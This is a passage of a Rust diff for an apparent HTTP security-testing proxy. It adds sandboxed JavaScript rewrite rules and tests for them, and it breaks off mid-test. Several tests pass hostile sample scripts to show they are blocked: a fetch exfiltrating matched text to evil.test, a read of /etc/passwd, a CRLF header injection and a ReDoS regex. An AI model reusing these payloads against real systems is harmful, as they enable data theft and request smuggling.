+    let (_, path, query) = target_parts(target);
+    let request = json!({
+        "line": first, "method": method, "target": target, "path": path, "query": query,
+        "headers": header_pairs(headers),
+    });
+    json!({ "request": with_bytes(request, "body", "bodyBase64", body) })
+}
+
+/// A response as a script reads it; `body` is its body decoded, when it could be.
+fn response_view(first: &str, headers: &[String], body: Option<&[u8]>) -> Value {
+    let status = first.split(' ').nth(1).and_then(|code| code.parse::<u16>().ok());
+    let response = json!({ "line": first, "status": status, "headers": header_pairs(headers), "body": null });
+    json!({ "response": body.map_or(response.clone(), |body| with_bytes(response, "body", "bodyBase64", body)) })
+}
+
+/// One request rule's turn at a request's line, headers and body; whether it changed them.
+fn request_rule(
+    rule: &CompiledRule,
+    first: &mut String,
+    headers: &mut Vec<String>,
+    body: &mut Vec<u8>,
+    cx: &Cx<'_>,
+) -> bool {
+    match rule.location {
+        RuleLocation::RequestLine => rule.rewrite_str(first, cx).is_some_and(|new| {
+            let changed = new != *first;
+            *first = new;
+            changed
+        }),
+        RuleLocation::Method | RuleLocation::Path | RuleLocation::QueryParam => edit_request_line(rule, first, cx),
+        RuleLocation::RequestHeader => {
+            let before = headers.clone();
+            apply_header_rule(rule, headers, cx);
+            before != *headers
+        }
+        RuleLocation::RequestBody => rule.rewrite(body, cx).is_some_and(|new| {
+            let changed = new != *body;
+            *body = new;
+            changed
+        }),
+        _ => false,
+    }
+}
+
+fn request_rules<'a>(active: &[&'a CompiledRule], req: &[u8], run: &Run<'_>) -> (Vec<u8>, Vec<&'a CompiledRule>) {
     let (head, raw_body) = split_head_body(req);
     let (mut first, mut headers) = split_lines(head);
     // Body rules see the data, not the chunk framing (which they would break).
@@ -867,26 +1314,20 @@ fn request_rules<'a>(active: &[&'a CompiledRule], req: &[u8]) -> (Vec<u8>, Vec<&
     let mut body_changed = false;
     let mut changed_by = Vec::new();
     for &rule in active {
-        let changed = match rule.location {
-            RuleLocation::RequestLine => rule.rewrite_str(&first).is_some_and(|new| {
-                let changed = new != first;
-                first = new;
-                changed
-            }),
-            RuleLocation::Method | RuleLocation::Path | RuleLocation::QueryParam => edit_request_line(rule, &mut first),
-            RuleLocation::RequestHeader => {
-                let before = headers.clone();
-                apply_header_rule(rule, &mut headers);
-                before != headers
-            }
-            RuleLocation::RequestBody => rule.rewrite(&body).is_some_and(|new| {
-                let changed = new != body;
-                body = new;
-                changed
-            }),
-            _ => false,
-        };
-        if changed {
+        // Dry, a script rule changes nothing: the line and headers are copies all the same.
+        if !run.wants(rule, |dry| {
+            request_rule(rule, &mut first.clone(), &mut headers.clone(), &mut body, dry);
+        }) {
+            continue;
+        }
+        let cx = run.cx(rule, || request_view(&first, &headers, &body));
+        // A script is called for each header or parameter of a name: one that failed after
+        // another was rewritten leaves neither changed. (A body goes to it in one call.)
+        let kept = cx.message.is_some().then(|| (first.clone(), headers.clone()));
+        let changed = request_rule(rule, &mut first, &mut headers, &mut body, &cx);
+        if let Some((line, lines)) = kept.filter(|_| cx.failed.get()) {
+            (first, headers) = (line, lines);
+        } else if changed {
             body_changed |= rule.location == RuleLocation::RequestBody;
             changed_by.push(rule);
         }
@@ -969,12 +1410,22 @@ fn reason(code: u16) -> &'static str {
 }
 
 /// Applies a status rule to a status line (`HTTP/1.1 200 OK`).
-fn edit_status(rule: &CompiledRule, first: &mut String) -> bool {
+fn edit_status(rule: &CompiledRule, first: &mut String, cx: &Cx<'_>) -> bool {
     let mut parts = first.splitn(3, ' ');
     let (Some(version), Some(code)) = (parts.next(), parts.next()) else { return false };
     let had_reason = parts.next().is_some();
-    let Some(replacement) = rule.rewrite_str(code) else { return false };
-    let Some((new_code, new_reason)) = status_parts(&replacement) else { return false };
+    let Some(replacement) = rule.rewrite_str(code, cx) else { return false };
+    let Some((new_code, new_reason)) = status_parts(&replacement) else {
+        // Text is checked when the rule is saved; what a script returns only now.
+        if matches!(rule.replacer, Replacer::Script(_)) {
+            let got: String = replacement.chars().take(40).collect();
+            cx.fail(
+                rule,
+                &format!("it returned {got:?}, which is no status: a code from 200 to 999, with a reason if you like"),
+            );
+        }
+        return false;
+    };
     // The same code and no reason given: the line stays as the server wrote it.
     if new_reason.is_none() && new_code.to_string() == code {
         return false;
@@ -992,7 +1443,40 @@ fn edit_status(rule: &CompiledRule, first: &mut String) -> bool {
 
 /// Applies response rules to the final response (after any 1xx interim responses). Body rules
 /// decode the body first and re-frame it with a Content-Length.
-fn response_rules<'a>(active: &[&'a CompiledRule], resp: &[u8]) -> (Vec<u8>, Vec<&'a CompiledRule>) {
+/// One response rule's turn at a response's status line, headers and decoded body (decoded
+/// by `decode` when a body rule first needs it); whether it changed them, and whether the body.
+fn response_rule(
+    rule: &CompiledRule,
+    first: &mut String,
+    headers: &mut Vec<String>,
+    decoded: &mut Option<Option<Vec<u8>>>,
+    decode: &dyn Fn() -> Option<Vec<u8>>,
+    cx: &Cx<'_>,
+) -> (bool, bool) {
+    match rule.location {
+        RuleLocation::Status => (edit_status(rule, first, cx), false),
+        RuleLocation::ResponseHeader => {
+            let before = headers.clone();
+            apply_header_rule(rule, headers, cx);
+            (before != *headers, false)
+        }
+        RuleLocation::ResponseBody if rule.matcher.is_some() => {
+            let changed = decoded.get_or_insert_with(decode).as_mut().is_some_and(|current| {
+                match rule.rewrite(current, cx).filter(|new| new != current) {
+                    Some(new) => {
+                        *current = new;
+                        true
+                    }
+                    None => false,
+                }
+            });
+            (changed, changed)
+        }
+        _ => (false, false),
+    }
+}
+
+fn response_rules<'a>(active: &[&'a CompiledRule], resp: &[u8], run: &Run<'_>) -> (Vec<u8>, Vec<&'a CompiledRule>) {
     let final_start = final_response_offset(resp);
     let (prefix, rest) = resp.split_at(final_start);
     let Ok(parsed) = parse_response_head(rest) else { return (resp.to_vec(), Vec::new()) };
@@ -1003,31 +1487,22 @@ fn response_rules<'a>(active: &[&'a CompiledRule], resp: &[u8]) -> (Vec<u8>, Vec
     let mut decoded: Option<Option<Vec<u8>>> = None;
     let mut body_changed = false;
     let mut changed_by = Vec::new();
+    // The response's body decoded, the first time something needs it.
+    let decode = || decode_body_fully(&parsed.headers, raw_body);
     for &rule in active {
-        let changed = match rule.location {
-            RuleLocation::Status => edit_status(rule, &mut first),
-            RuleLocation::ResponseHeader => {
-                let before = headers.clone();
-                apply_header_rule(rule, &mut headers);
-                before != headers
-            }
-            RuleLocation::ResponseBody if rule.matcher.is_some() => {
-                let current = decoded.get_or_insert_with(|| decode_body_fully(&parsed.headers, raw_body));
-                match current.as_mut().and_then(|current| {
-                    let new = rule.rewrite(current).filter(|new| new != current)?;
-                    *current = new;
-                    Some(())
-                }) {
-                    Some(()) => {
-                        body_changed = true;
-                        true
-                    }
-                    None => false,
-                }
-            }
-            _ => false,
-        };
-        if changed {
+        if !run.wants(rule, |dry| {
+            response_rule(rule, &mut first.clone(), &mut headers.clone(), &mut decoded, &decode, dry);
+        }) {
+            continue;
+        }
+        let cx = run.cx(rule, || response_view(&first, &headers, decoded.get_or_insert_with(decode).as_deref()));
+        // As for a request: a script that failed on one header of several changes none.
+        let kept = cx.message.is_some().then(|| (first.clone(), headers.clone()));
+        let (changed, body) = response_rule(rule, &mut first, &mut headers, &mut decoded, &decode, &cx);
+        if let Some((line, lines)) = kept.filter(|_| cx.failed.get()) {
+            (first, headers) = (line, lines);
+        } else if changed {
+            body_changed |= body;
             changed_by.push(rule);
         }
     }
@@ -1065,19 +1540,14 @@ fn header_parts(line: &str) -> Option<(&str, &str)> {
     line.split_once(':').map(|(name, value)| (name, value.trim()))
 }
 
-fn apply_header_rule(rule: &CompiledRule, headers: &mut Vec<String>) {
+fn apply_header_rule(rule: &CompiledRule, headers: &mut Vec<String>, cx: &Cx<'_>) {
     let Some(name) = rule.name.as_deref() else {
         match &rule.matcher {
-            None => {
-                let line = rule.replacer.fresh();
-                if !line.is_empty() {
-                    headers.push(line);
-                }
-            }
+            None => headers.extend(rule.fresh(cx).filter(|line| !line.is_empty())),
             Some(_) => {
                 *headers = headers
                     .iter()
-                    .map(|h| rule.rewrite_str(h).unwrap_or_else(|| h.clone()))
+                    .map(|h| rule.rewrite_str(h, cx).unwrap_or_else(|| h.clone()))
                     .filter(|h| !h.is_empty())
                     .collect();
             }
@@ -1086,7 +1556,7 @@ fn apply_header_rule(rule: &CompiledRule, headers: &mut Vec<String>) {
     };
     let is = |line: &str| header_parts(line).is_some_and(|(k, _)| k.trim().eq_ignore_ascii_case(name));
     match rule.action {
-        RuleAction::Add => headers.push(format!("{name}: {}", rule.replacer.fresh())),
+        RuleAction::Add => headers.extend(rule.fresh(cx).map(|new| format!("{name}: {new}"))),
         RuleAction::Remove => headers.retain(|h| !(is(h) && rule.matches(header_parts(h).map_or("", |(_, v)| v)))),
         RuleAction::Set => {
             let mut found = false;
@@ -1094,12 +1564,12 @@ fn apply_header_rule(rule: &CompiledRule, headers: &mut Vec<String>) {
                 found = true;
                 let Some((key, value)) = header_parts(line) else { continue };
                 // A value left as it is leaves the line as written, spacing and all.
-                if let Some(new) = rule.rewrite_str(value).filter(|new| new != value) {
+                if let Some(new) = rule.rewrite_str(value, cx).filter(|new| new != value) {
                     *line = format!("{key}: {new}");
                 }
             }
             if !found && rule.sets_any() {
-                headers.push(format!("{name}: {}", rule.replacer.fresh()));
+                headers.extend(rule.fresh(cx).map(|new| format!("{name}: {new}")));
             }
         }
     }
@@ -1539,5 +2009,423 @@ mod tests {
         let mut other = named(2, RuleLocation::RequestHeader, "X-A", RuleAction::Set, "", "b");
         other.origin = Some("mcp".into());
         assert_eq!(ruled(&other).agent_host(&opts, &target), None);
+    }
+
+    /// A rule whose replacement `script` makes, in a file of its own; the folder is the caller's
+    /// to remove.
+    fn scripted(id: u32, loc: RuleLocation, pattern: &str, script: &str) -> (Rule, std::path::PathBuf) {
+        crate::sandbox::tests::use_test_runner();
+        let (script, dir) = crate::hooks::tests::script_file(script);
+        (Rule { replacer: ReplaceKind::Script, script: Some(script), ..rule(id, loc, pattern, "") }, dir)
+    }
+
+    fn failed(out: &Ruled) -> Vec<(u32, &str)> {
+        out.failed.iter().map(|f| (f.id, f.error.as_str())).collect()
+    }
+
+    fn failed_of(out: &Ruled) -> Vec<(u32, &str)> {
+        failed(out)
+    }
+
+    #[test]
+    fn a_script_signs_a_request_from_what_it_is_told() {
+        let (mut sign, dir) = scripted(
+            1,
+            RuleLocation::RequestHeader,
+            "",
+            "function replace(match, ctx) {
+                const r = ctx.request;
+                const host = r.headers.find(([name]) => name.toLowerCase() === 'host')[1];
+                const text = [ctx.location, ctx.name, ctx.engine, ctx.host, r.method, r.path, r.query, host, r.body].join('|');
+                return CryptoJS.HmacSHA256(text, 'k').toString(CryptoJS.enc.Hex) + ';was=' + match.text;
+            }",
+        );
+        sign.name = Some("X-Sig".into());
+        validate_rule(&sign).unwrap();
+        verify_script(&sign).unwrap();
+        let req = "POST /a/b?c=1 HTTP/1.1\r\nHost: h.test\r\nX-Sig: old\r\nContent-Length: 4\r\n\r\nbody";
+        let (out, ids) = request(std::slice::from_ref(&sign), req);
+        let text = "request-header|X-Sig|proxy|h.test|POST|/a/b|c=1|h.test|body";
+        let mac = hex::encode(crate::sign::hmac_digest(crate::sign::HmacAlg::Sha256, b"k", text.as_bytes()));
+        assert_eq!(out, req.replace("X-Sig: old", &format!("X-Sig: {mac};was=old")));
+        assert_eq!(ids, [1]);
+        // With no such header the rule sets one, and the script is told there was nothing.
+        let (out, _) = request(std::slice::from_ref(&sign), "GET / HTTP/1.1\r\nHost: h.test\r\n\r\n");
+        assert!(out.contains("\r\nX-Sig: ") && out.contains(";was=\r\n"), "{out}");
+        // It sees the request as the rules before it left it.
+        let before = rule(2, RuleLocation::RequestBody, "body", "BODY");
+        let (out, ids) = request(&[before, sign.clone()], req);
+        let text = "request-header|X-Sig|proxy|h.test|POST|/a/b|c=1|h.test|BODY";
+        let mac = hex::encode(crate::sign::hmac_digest(crate::sign::HmacAlg::Sha256, b"k", text.as_bytes()));
+        assert!(out.contains(&format!("X-Sig: {mac};was=old")) && out.ends_with("BODY"), "{out}");
+        assert_eq!(ids, [2, 1]);
+        let _ = std::fs::remove_dir_all(dir);
+    }
+
+    #[test]
+    fn a_script_gets_every_match_with_its_groups_and_may_leave_one() {
+        let (r, dir) = scripted(
+            1,
+            RuleLocation::RequestBody,
+            r"(?P<key>\w+)=(\d+)(x)?",
+            "function replace(m) {
+                if (m.named.key === 'keep') return null;
+                return m.groups[1] + '=' + (Number(m.groups[2]) + 1) + String(m.groups[3]) + '[' + m.text + ']';
+            }",
+        );
+        let (out, ids) = request(&[r], "POST / HTTP/1.1\r\nContent-Length: 17\r\n\r\na=1&keep=5&b=41x;");
+        assert_eq!(out, "POST / HTTP/1.1\r\nContent-Length: 33\r\n\r\na=2null[a=1]&keep=5&b=42x[b=41x];");
+        assert_eq!(ids, [1]);
+        let _ = std::fs::remove_dir_all(dir);
+        // A literal match has no groups to give.
+        let (mut r, dir) =
+            scripted(2, RuleLocation::Path, "/a", "function replace(m) { return '/' + typeof m.groups; }");
+        r.matcher = MatchKind::Literal;
+        assert_eq!(request(&[r], "GET /a/a HTTP/1.1\r\n\r\n").0, "GET /undefined/undefined HTTP/1.1\r\n\r\n");
+        let _ = std::fs::remove_dir_all(dir);
+    }
+
+    #[test]
+    fn a_script_that_fails_leaves_the_message_and_says_so() {
+        let req = "GET /a HTTP/1.1\r\nHost: h.test\r\nX-A: 1\r\n\r\n";
+        let after = rule(9, RuleLocation::RequestHeader, "^X-A: 1$", "X-A: 2");
+        for (script, why) in [
+            ("function replace(m) { throw new Error('no ' + m.text); }", "no /a"),
+            ("function replace(m) { return 5; }", "it returned a number"),
+            ("function replace(m) { }", "it returned nothing"),
+            ("function replace(m) { return { text: 'x' }; }", "it returned an object"),
+            ("function replace(m) { return '/b\\r\\nHost: evil.test'; }", "a line break or NUL"),
+            ("function replace(m) { return '/b\\0'; }", "a line break or NUL"),
+            ("function replace(m) { return fetch('http://evil.test/' + m.text); }", "fetch is not defined"),
+            (
+                "function replace(m) { return require('fs').readFileSync('/etc/passwd', 'utf8'); }",
+                "isn't available here",
+            ),
+        ] {
+            let (r, dir) = scripted(1, RuleLocation::Path, "", script);
+            let out = RuleSet::compile(&[r, after.clone()]).unwrap().request(Engine::Proxy, "h.test", req.into());
+            // The rule after it still applied; the failed one changed nothing.
+            assert_eq!(String::from_utf8_lossy(&out.bytes), req.replace("X-A: 1", "X-A: 2"), "{script}");
+            assert_eq!(out.ids(), [9], "{script}");
+            let failed = failed(&out);
+            assert!(failed.len() == 1 && failed[0].0 == 1 && failed[0].1.contains(why), "{script}: {failed:?}");
+            let _ = std::fs::remove_dir_all(dir);
+        }
+        // One match of several that fails fails the rule: none is replaced.
+        let (r, dir) = scripted(
+            1,
+            RuleLocation::RequestBody,
+            r"\d",
+            "function replace(m) { if (m.text === '2') throw new Error('two'); return 'n'; }",
+        );
+        let out = RuleSet::compile(&[r]).unwrap().request(Engine::Proxy, "h", b"POST / HTTP/1.1\r\n\r\n1 2 3".to_vec());
+        assert!(!out.changed() && failed(&out)[0].1.contains("two"), "{out:?}");
+        let _ = std::fs::remove_dir_all(dir);
+    }
+
+    #[test]
+    fn a_script_that_never_returns_is_stopped_and_its_rule_does_nothing_more() {
+        let (r, dir) = scripted(
+            1,
+            RuleLocation::Path,
+            "",
+            "function replace(m) { if (m.text === '/slow') /^(a+)+$/.test('a'.repeat(40) + 'b'); return '/done'; }",
+        );
+        let set = RuleSet::compile(&[r]).unwrap();
+        let get = |path: &str| set.request(Engine::Proxy, "h", format!("GET {path} HTTP/1.1\r\n\r\n").into_bytes());
+        assert_eq!(get("/a").bytes, b"GET /done HTTP/1.1\r\n\r\n");
+        let started = std::time::Instant::now();
+        let out = get("/slow");
+        assert!(!out.changed() && failed(&out)[0].1.contains("time limit"), "{out:?}");
+        assert!(started.elapsed() < crate::sandbox::CALL_LIMIT + std::time::Duration::from_secs(3));
+        let started = std::time::Instant::now();
+        let out = get("/a");
+        assert!(!out.changed() && failed(&out)[0].1.contains("stopped earlier"), "{out:?}");
+        assert!(started.elapsed() < std::time::Duration::from_millis(500), "a stopped script isn't waited for again");
+        let _ = std::fs::remove_dir_all(dir);
+    }
+
+    #[test]
+    fn a_script_works_on_responses_statuses_and_messages() {
+        let (body, dir_a) = scripted(
+            1,
+            RuleLocation::ResponseBody,
+            "\"role\":\"(\\w+)\"",
+            "function replace(m, ctx) { return '\"role\":\"' + ctx.response.status + m.groups[1] + ctx.response.headers[0][0] + '\"'; }",
+        );
+        let (status, dir_b) = scripted(
+            2,
+            RuleLocation::Status,
+            "",
+            "function replace(m, ctx) { return ctx.response.body.includes('teapot') ? '418' : m.text === '500' ? 'five' : null; }",
+        );
+        let rules = [body, status];
+        let resp = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 15\r\n\r\n{\"role\":\"user\"}";
+        let (out, ids) = response(&rules, resp);
+        assert_eq!(out, "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 30\r\n\r\n{\"role\":\"200userContent-Type\"}");
+        assert_eq!(ids, [1]);
+        let (out, ids) = response(&rules, "HTTP/1.1 200 OK\r\nContent-Length: 6\r\n\r\nteapot");
+        assert_eq!((out.as_str(), ids), ("HTTP/1.1 418 I'm a teapot\r\nContent-Length: 6\r\n\r\nteapot", vec![2]));
+        // What a script returns as a status is checked like a rule's text, when it has run.
+        let set = RuleSet::compile(&rules).unwrap();
+        let out = set.response(Engine::Proxy, "h", b"HTTP/1.1 500 Oops\r\nContent-Length: 0\r\n\r\n".to_vec());
+        assert!(
+            !out.changed() && failed(&out) == [(2, failed(&out)[0].1)] && failed(&out)[0].1.contains("is no status")
+        );
+        for dir in [dir_a, dir_b] {
+            let _ = std::fs::remove_dir_all(dir);
+        }
+        // A message that isn't text comes as base64 and may go back so.
+        let (ws, dir) = scripted(
+            3,
+            RuleLocation::WsMessage,
+            "",
+            "function replace(m, ctx) {
+                if (!m.base64) return ctx.engine + ':' + ctx.message.text.toUpperCase();
+                return { base64: btoa(atob(m.base64) + '\\u00ff') };
+            }",
+        );
+        let set = RuleSet::compile(&[ws]).unwrap();
+        assert_eq!(set.ws_message(Engine::WsToServer, "h", b"hi").bytes, b"ws-to-server:HI");
+        assert_eq!(set.ws_message(Engine::WsToClient, "h", &[0xfe, 0x00]).bytes, [0xfe, 0x00, 0xff]);
+        let _ = std::fs::remove_dir_all(dir);
+    }
+
+    #[test]
+    fn a_script_gives_the_value_of_what_a_rule_adds() {
+        let script = "function replace(m, ctx) { return ctx.name + '-' + ctx.request.method + m.text.length; }";
+        let (mut header, dir_a) = scripted(1, RuleLocation::RequestHeader, "", script);
+        (header.name, header.action) = (Some("X-New".into()), Some(RuleAction::Add));
+        let (mut param, dir_b) = scripted(2, RuleLocation::QueryParam, "", script);
+        param.name = Some("t".into());
+        let (line, dir_c) = scripted(3, RuleLocation::RequestHeader, "", "function replace() { return 'X-Line: 1'; }");
+        let (none, dir_d) = scripted(4, RuleLocation::RequestHeader, "", "function replace() { return null; }");
+        let (out, ids) = request(&[header, param, line, none], "GET /a HTTP/1.1\r\nHost: h\r\n\r\n");
+        assert_eq!(out, "GET /a?t=t-GET0 HTTP/1.1\r\nHost: h\r\nX-New: X-New-GET0\r\nX-Line: 1\r\n\r\n");
+        assert_eq!(ids, [1, 2, 3]);
+        for dir in [dir_a, dir_b, dir_c, dir_d] {
+            let _ = std::fs::remove_dir_all(dir);
+        }
+    }
+
+    #[test]
+    fn a_script_rule_is_stored_with_its_pin_and_skipped_when_its_file_changes() {
+        let (mut r, dir) = scripted(7, RuleLocation::Path, "", "function replace(m) { return '/x'; }");
+        let stored = serde_json::to_value(&r).unwrap();
+        let script = r.script.clone().unwrap();
+        assert_eq!(stored["replacer"], "script");
+        assert_eq!(stored["script"], json!({"file": script.file, "sha256": script.sha256}));
+        assert_eq!(serde_json::from_value::<Rule>(stored).unwrap(), r);
+        // A text rule is stored as it always was.
+        let text = serde_json::to_value(rule(1, RuleLocation::Path, "", "/")).unwrap();
+        assert!(text.get("replacer").is_none() && text.get("script").is_none());
+        validate_rule(&r).unwrap();
+        assert_eq!(script_problem(&r), None);
+        // What a script rule can't have.
+        assert!(validate_rule(&Rule { replace: "/y".into(), ..r.clone() }).is_err());
+        assert!(validate_rule(&Rule { script: None, ..r.clone() }).is_err());
+        assert!(validate_rule(&Rule { replacer: ReplaceKind::Text, ..r.clone() }).is_err());
+        let mut named = named(1, RuleLocation::RequestHeader, "X-A", RuleAction::Remove, "", "");
+        (named.replacer, named.script) = (ReplaceKind::Script, r.script.clone());
+        assert!(validate_rule(&named).unwrap_err().to_string().contains("remove takes no --script"));
+        // A status rule's script is checked when it runs, not when it is saved.
+        validate_rule(&Rule { location: RuleLocation::Status, ..r.clone() }).unwrap();
+        // The file changes: the rule is left out, the others stay, and saving it again is refused.
+        std::fs::write(&script.file, "function replace(m) { return '/other'; }").unwrap();
+        let after = rule(8, RuleLocation::Method, "", "PUT");
+        let (out, ids) = request(&[r.clone(), after], "GET / HTTP/1.1\r\n\r\n");
+        assert_eq!((out.as_str(), ids), ("PUT / HTTP/1.1\r\n\r\n", vec![8]));
+        assert!(script_problem(&r).unwrap().contains("changed since it was named"));
+        assert!(validate_rule(&r).unwrap_err().to_string().contains("changed since it was named"));
+        assert!(verify_script(&r).is_err());
+        // A script with no replace function is found when it is verified.
+        std::fs::write(&script.file, "function other() {}").unwrap();
+        r.script = Some(ScriptRef::pin(&script.file, None).unwrap());
+        validate_rule(&r).unwrap();
+        assert!(verify_script(&r).unwrap_err().to_string().contains("it defines no replace function"));
+        let _ = std::fs::remove_dir_all(dir);
+    }
+
+    #[test]
+    fn a_host_a_script_brings_in_is_found_like_a_text_rules() {
+        let target = Target { scheme: "https".into(), host: "h.test".into(), port: 443 };
+        let opts = SendOptions::default();
+        let req = b"GET / HTTP/1.1\r\nHost: h.test\r\n\r\n".to_vec();
+        let (mut host, dir_a) = scripted(
+            1,
+            RuleLocation::RequestHeader,
+            "",
+            "function replace(m) { return 'evil.' + m.text.split('.')[1]; }",
+        );
+        host.name = Some("Host".into());
+        let (mut path, dir_b) =
+            scripted(2, RuleLocation::Path, "", "function replace(m) { return 'http://evil.test' + m.text; }");
+        for r in [&mut host, &mut path] {
+            let ruled = |r: &Rule| {
+                RuleSet::compile(std::slice::from_ref(r)).unwrap().request(Engine::Proxy, "h.test", req.clone())
+            };
+            assert_eq!(ruled(r).agent_host(&opts, &target), None, "a person's rule");
+            r.origin = Some("mcp".into());
+            assert_eq!(ruled(r).agent_host(&opts, &target).as_deref(), Some("evil.test"), "rule {}", r.id);
+            assert!(matches!(ruled(r).check_host(&opts, &target), Err(Error::OutOfScope(_))));
+            r.host_header_test = true;
+            assert_eq!(ruled(r).agent_host(&opts, &target), None);
+        }
+        for dir in [dir_a, dir_b] {
+            let _ = std::fs::remove_dir_all(dir);
+        }
+    }
+
+    #[test]
+    fn a_scripts_failure_is_noted_in_the_project_once_and_forgotten_with_its_rule() {
+        let dir = std::env::temp_dir().join(format!("bp-rule-failures-{}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let project = dir.join("p.bpdb");
+        let store = Store::open(&project).unwrap();
+        let log = FailureLog::of(&store);
+        let failed = |id: u32, error: &str| Failed { id, error: error.to_string() };
+        log.note(Engine::Proxy, &[]);
+        assert_eq!(noted_failures(&store), json!({}));
+        log.note(Engine::Proxy, &[failed(901, "Error: one"), failed(902, "Error: two")]);
+        let noted = noted_failures(&store);
+        assert_eq!(
+            (noted["901"]["error"].as_str(), noted["901"]["engine"].as_str()),
+            (Some("Error: one"), Some("proxy"))
+        );
+        assert!(noted["901"]["time"].as_str().unwrap().ends_with('Z') && noted["902"]["error"] == "Error: two");
+        // The same failure again writes nothing, and another only once the note has stood a while.
+        store.meta_set(RULE_FAILURES, None).unwrap();
+        log.note(Engine::Fuzz, &[failed(901, "Error: one")]);
+        log.note(Engine::Fuzz, &[failed(901, "Error: other")]);
+        assert_eq!(noted_failures(&store), json!({}));
+        let earlier = std::time::Instant::now().checked_sub(NOTE_EVERY).unwrap();
+        log.noted.lock().unwrap().values_mut().for_each(|(_, when)| *when = earlier);
+        log.note(Engine::Fuzz, &[failed(901, "Error: one")]);
+        assert_eq!(noted_failures(&store), json!({}));
+        log.note(Engine::Fuzz, &[failed(901, "Error: other")]);
+        assert_eq!(
+            (noted_failures(&store)["901"]["engine"].as_str(), noted_failures(&store)["901"]["error"].as_str()),
+            (Some("fuzz"), Some("Error: other"))
+        );
+        // A log made anew (the proxy's, when its rules load again) notes what the old one had.
+        store.meta_set(RULE_FAILURES, None).unwrap();
+        FailureLog::of(&store).note(Engine::Proxy, &[failed(901, "Error: other")]);
+        assert_eq!(noted_failures(&store)["901"]["engine"], "proxy");
+        log.note(Engine::Scan, &[failed(903, "Error: three")]);
+        forget_failures(&store, |id| id == 903).unwrap();
+        let noted = noted_failures(&store);
+        assert!(noted.get("901").is_none() && noted["903"]["engine"] == "scan", "{noted}");
+        forget_failures(&store, |_| false).unwrap();
+        assert_eq!(store.meta_get(RULE_FAILURES).unwrap(), None);
+        // A project in memory has nowhere to note one, and that is no error.
+        FailureLog::of(&Store::open_in_memory().unwrap()).note(Engine::Proxy, &[failed(904, "x")]);
+        // An engine's rules note what failed as they are applied.
+        let (r, script_dir) = scripted(905, RuleLocation::Path, "", "function replace() { throw new Error('noted'); }");
+        store.set_setting(RULES_KEY, &[Rule { applies_to: vec![Engine::Send], ..r }]).unwrap();
+        let rules = EngineRules::load(&store, Engine::Send).unwrap().unwrap();
+        let target = Target { scheme: "https".into(), host: "h.test".into(), port: 443 };
+        let out = rules.request(&SendOptions::default(), &target, b"GET / HTTP/1.1\r\n\r\n".to_vec()).unwrap();
+        assert_eq!(failed_of(&out), [(905, "Error: noted")]);
+        assert_eq!(noted_failures(&store)["905"]["engine"], "send");
+        drop(store);
+        for dir in [dir, script_dir] {
+            let _ = std::fs::remove_dir_all(dir);
+        }
+    }
+
+    #[test]
+    fn a_script_is_called_only_where_its_rule_matches_something() {
+        // It throws whenever it is called: a message it isn't called for has no failure.
+        let throws = "function replace(m, ctx) { throw new Error('called for ' + m.text); }";
+        let (status, dir_a) = scripted(1, RuleLocation::Status, "^403$", throws);
+        let (mut header, dir_b) = scripted(2, RuleLocation::ResponseHeader, "^on$", throws);
+        header.name = Some("X-Debug".into());
+        let (body, dir_c) = scripted(3, RuleLocation::ResponseBody, "secret", throws);
+        let set = RuleSet::compile(&[status, header, body]).unwrap();
+        let respond = |resp: &str| set.response(Engine::Proxy, "h", resp.as_bytes().to_vec());
+        let out = respond("HTTP/1.1 200 OK\r\nX-Debug: off\r\nContent-Length: 5\r\n\r\nplain");
+        assert!(!out.changed() && out.failed.is_empty(), "{out:?}");
+        let out = respond("HTTP/1.1 403 No\r\nX-Debug: on\r\nContent-Length: 6\r\n\r\nsecret");
+        let called: Vec<(u32, &str)> = failed(&out);
+        assert_eq!(
+            called,
+            [(1, "Error: called for 403"), (2, "Error: called for on"), (3, "Error: called for secret")]
+        );
+        // Requests and messages alike: a named header that isn't there, a path that doesn't match.
+        let (mut sets, dir_d) = scripted(4, RuleLocation::RequestHeader, "^a$", throws);
+        sets.name = Some("X-A".into());
+        let (path, dir_e) = scripted(5, RuleLocation::Path, "^/admin", throws);
+        let (query, dir_f) = scripted(6, RuleLocation::RequestBody, "token=", throws);
+        let (ws, dir_g) = scripted(7, RuleLocation::WsMessage, "ping", throws);
+        let set = RuleSet::compile(&[sets, path, query, ws]).unwrap();
+        let out = set.request(Engine::Proxy, "h", b"POST /a HTTP/1.1\r\nX-B: a\r\n\r\nbody".to_vec());
+        assert!(!out.changed() && out.failed.is_empty(), "{out:?}");
+        let out = set.request(Engine::Proxy, "h", b"POST /admin HTTP/1.1\r\nX-A: a\r\n\r\ntoken=1".to_vec());
+        assert_eq!(out.failed.iter().map(|f| f.id).collect::<Vec<_>>(), [4, 5, 6]);
+        assert!(set.ws_message(Engine::WsToServer, "h", b"pong").failed.is_empty());
+        assert_eq!(set.ws_message(Engine::WsToServer, "h", b"ping").failed.len(), 1);
+        for dir in [dir_a, dir_b, dir_c, dir_d, dir_e, dir_f, dir_g] {
+            let _ = std::fs::remove_dir_all(dir);
+        }
+    }
+
+    #[test]
+    fn a_script_rule_names_its_file_by_its_full_path() {
+        let (r, dir) = scripted(1, RuleLocation::Path, "", "function replace(m) { return '/x'; }");
+        let script = r.script.clone().unwrap();
+        let relative = ScriptRef { file: script.file.file_name().unwrap().into(), ..script };
+        let e = validate_rule(&Rule { script: Some(relative), ..r.clone() }).unwrap_err().to_string();
+        assert!(e.contains("named by its full path"), "{e}");
+        validate_rule(&r).unwrap();
+        let _ = std::fs::remove_dir_all(dir);
+    }
+
+    #[test]
+    fn a_script_that_fails_on_one_of_several_headers_or_parameters_changes_none() {
+        let script =
+            "function replace(m) { if (m.text.includes('bad')) throw new Error('no ' + m.text); return 'new'; }";
+        let (mut param, dir_a) = scripted(1, RuleLocation::QueryParam, "", script);
+        param.name = Some("q".into());
+        let (mut header, dir_b) = scripted(2, RuleLocation::RequestHeader, "", script);
+        header.name = Some("X-A".into());
+        let (lines, dir_c) = scripted(3, RuleLocation::RequestHeader, "^X-B: .*$", script);
+        let after = rule(9, RuleLocation::Method, "", "PUT");
+        let set = RuleSet::compile(&[param.clone(), header.clone(), lines, after]).unwrap();
+        let req = "GET /a?q=ok&q=bad HTTP/1.1\r\nX-A: ok\r\nX-A: bad\r\nX-B: ok\r\nX-B: bad\r\n\r\n";
+        let out = set.request(Engine::Proxy, "h", req.as_bytes().to_vec());
+        // Nothing of the three is half done; the rule after them applied.
